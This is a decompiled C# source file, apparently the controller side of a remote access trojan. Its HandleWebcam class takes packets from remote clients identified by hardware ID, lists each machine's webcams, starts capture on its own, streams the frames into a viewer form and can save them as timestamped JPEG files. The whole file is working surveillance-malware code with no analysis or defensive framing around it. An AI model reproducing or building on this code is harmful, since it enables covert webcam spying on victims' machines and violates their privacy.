using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.Helper;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200008C RID: 140
	internal class HandleWebcam
	{
		// Token: 0x06000441 RID: 1089 RVA: 0x00028BFC File Offset: 0x00026DFC
		public HandleWebcam(MsgPack unpack_msgpack, Clients client)
		{
			string asString = unpack_msgpack.ForcePathObject("Command").AsString;
			if (!(asString == "getWebcams"))
			{
				if (!(asString == "capture"))
				{
					return;
				}
			}
			else
			{
				FormWebcam formWebcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
				try
				{
					if (formWebcam != null)
					{
						formWebcam.Client = client;
						formWebcam.timer1.Start();
						foreach (string text in unpack_msgpack.ForcePathObject("List").AsString.Split(new string[]
						{
							"-=>"
						}, StringSplitOptions.None))
						{
							if (!string.IsNullOrWhiteSpace(text))
							{
								formWebcam.comboBox1.Items.Add(text);
							}
						}
						formWebcam.comboBox1.SelectedIndex = 0;
						if (formWebcam.comboBox1.Text == "None")
						{
							client.Disconnected();
						}
						else
						{
							formWebcam.comboBox1.Enabled = true;
							formWebcam.button1.Enabled = true;
							formWebcam.btnSave.Enabled = true;
							formWebcam.numericUpDown1.Enabled = true;
							formWebcam.labelWait.Visible = false;
							formWebcam.button1.PerformClick();
						}
					}
					else
					{
						client.Disconnected();
					}
					return;
				}
				catch
				{
					return;
				}
			}
			FormWebcam formWebcam2 = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
			try
			{
				if (formWebcam2 != null)
				{
					using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
					{
						formWebcam2.GetImage = (Image)Image.FromStream(memoryStream).Clone();
						formWebcam2.pictureBox1.Image = formWebcam2.GetImage;
						formWebcam2.FPS++;
						if (formWebcam2.sw.ElapsedMilliseconds >= 1000L)
						{
							if (formWebcam2.SaveIt)
							{
								if (!Directory.Exists(formWebcam2.FullPath))
								{
									Directory.CreateDirectory(formWebcam2.FullPath);
								}
								formWebcam2.pictureBox1.Image.Save(formWebcam2.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
							}
							Control control = formWebcam2;
							string[] array2 = new string[10];
							array2[0] = "Webcam:";
							array2[1] = unpack_msgpack.ForcePathObject("Hwid").AsString;
							array2[2] = "    FPS:";
							int num = 3;
							int i = formWebcam2.FPS;
							array2[num] = i.ToString();
							array2[4] = "    Screen:";
							array2[5] = formWebcam2.GetImage.Width.ToString();
							array2[6] = " x ";
							array2[7] = formWebcam2.GetImage.Height.ToString();
							array2[8] = "    Size:";
							array2[9] = Methods.BytesToString(memoryStream.Length);
							control.Text = string.Concat(array2);
							formWebcam2.FPS = 0;
							formWebcam2.sw = Stopwatch.StartNew();
						}
						goto IL_31C;
					}
				}
				client.Disconnected();
				IL_31C:;
			}
			catch
			{
			}
		}
	}
}
